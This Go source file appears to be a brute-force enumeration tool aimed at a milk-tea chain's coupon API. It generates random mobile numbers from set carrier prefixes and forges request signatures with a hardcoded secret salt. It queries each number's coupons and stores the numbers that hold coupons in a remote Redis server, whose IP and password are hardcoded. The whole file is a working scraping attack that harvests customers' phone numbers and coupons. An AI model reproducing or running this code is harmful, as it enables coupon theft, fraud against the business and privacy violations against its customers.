package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/go-redis/redis"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"time"
)

type CouponListsss struct {
	Data []struct {
		CouponSn      string      `json:"couponSn"`
		CouponUseTime interface{} `json:"couponUseTime"`
		CouponTitle   string      `json:"couponTitle"`
		CanGiveAway   int         `json:"canGiveAway"`
	} `json:"data"`
}

func main() {

	db := redisUtilsss()
	db.Ping()

	var pre string //1311 1382 1392 1552 1562 1892 1343 1354 1592 1898 1591 1506

	flag.StringVar(&pre, "pre", "null", "号段Pre")
	flag.Parse()

	for {
		t := pre + fmt.Sprintf("%07v", rand.New(rand.NewSource(time.Now().UnixNano())).Int63n(10000000))
		res := getConponListss(t).Data
		log.Println(t, res)
		if len(res) > 0 {
			db.SAdd("奶茶来啦", t)
		}
	}

}

func getSss(time string) string {
	h := sha1.New()
	io.WriteString(h, time+"245U6Watb875eCiX4Lq")
	return hex.EncodeToString(h.Sum(nil))
}

// 用手机号查券列表
func getConponListss(phone string) CouponListsss {
	var cpList CouponListsss
	client := &http.Client{}

	times := time.Now().UnixMilli() / 1000
	s := getSss(strconv.Itoa(int(times)))

	req, _ := http.NewRequest("POST", "https://vapi.hsayi.com/open/coupon/user-coupon-sn-list", bytes.NewReader([]byte("{\n  \"stateList\" : [\n    0,\n    5\n  ],\n  \"mobile\" : \""+phone+"\",\n  \"pageSize\" : 10,\n  \"page\" : 1\n}")))
	req.Header.Set("SIGN", s)
	req.Header.Set("NONCE", "245")
	req.Header.Set("TIMESTAMP", strconv.Itoa(int(times)))
	req.Header.Set("content-type", "application/json")

	resp, _ := client.Do(req)
	defer resp.Body.Close()
	res, _ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(res, &cpList)
	return cpList
}

func redisUtilsss() *redis.Client {
	rdb := redis.NewClient(&redis.Options{Addr: "175.27.243.243:6379", Password: "213879", DB: 0})
	return rdb
}
